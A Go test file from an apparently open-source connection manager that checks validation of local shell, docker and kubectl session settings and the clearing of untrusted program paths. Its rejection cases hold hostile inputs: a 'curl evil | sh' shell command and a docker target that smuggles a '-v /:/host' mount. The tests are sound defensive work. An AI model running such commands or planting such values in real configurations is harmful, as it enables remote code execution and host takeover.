// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 The YACM Authors. Additional terms under GPLv3 section 7: see NOTICE.md.

package store

import (
	"runtime"
	"testing"
)

func TestLocalSessions(t *testing.T) {
	path := "/usr/bin/fish"
	if runtime.GOOS == "windows" {
		path = `C:\Program Files\Git\bin\bash.exe`
	}
	ok := []*LocalOptions{
		{Kind: "shell"}, {Kind: "shell", Shell: "pwsh"}, {Kind: "shell", Shell: path},
		{Kind: "docker", Target: "netbox", Command: "bash"},
		{Kind: "kubectl", Target: "web-1", Namespace: "prod", Container: "app", Context: "eu"},
	}
	for _, lo := range ok {
		if err := Validate(&Node{Name: "x", Session: &Session{Protocol: ProtoLocal, Local: lo}}); err != nil {
			t.Errorf("%+v: %v", lo, err)
		}
	}
	bad := []*Session{
		{Protocol: ProtoLocal},
		{Protocol: ProtoLocal, Local: &LocalOptions{Kind: "docker"}},
		{Protocol: ProtoLocal, Local: &LocalOptions{Kind: "docker", Target: "-v /:/host"}},
		{Protocol: ProtoLocal, Local: &LocalOptions{Kind: "shell", Shell: "curl evil | sh"}},
	}
	for _, ss := range bad {
		if err := Validate(&Node{Name: "x", Session: ss}); err == nil {
			t.Errorf("accepted %+v", ss.Local)
		}
	}
	// Leaving the local type drops its settings.
	n := &Node{Name: "x", Session: &Session{Protocol: ProtoSSH, Host: "h", Local: &LocalOptions{Kind: "shell"}}}
	if err := Validate(n); err != nil || n.Session.Local != nil {
		t.Fatalf("%v %+v", err, n.Session.Local)
	}
}

func TestDisarmLocal(t *testing.T) {
	n := &Node{Session: &Session{Protocol: ProtoLocal, Local: &LocalOptions{Kind: "shell", Shell: `C:\tools\evil.exe`}}}
	if !DisarmLocal(n) || n.Session.Local.Shell != "" {
		t.Fatal("a program path from someone else's file stays")
	}
	n.Session.Local.Shell = "wsl"
	if DisarmLocal(n) || n.Session.Local.Shell != "wsl" {
		t.Fatal("a named shell was changed")
	}
}
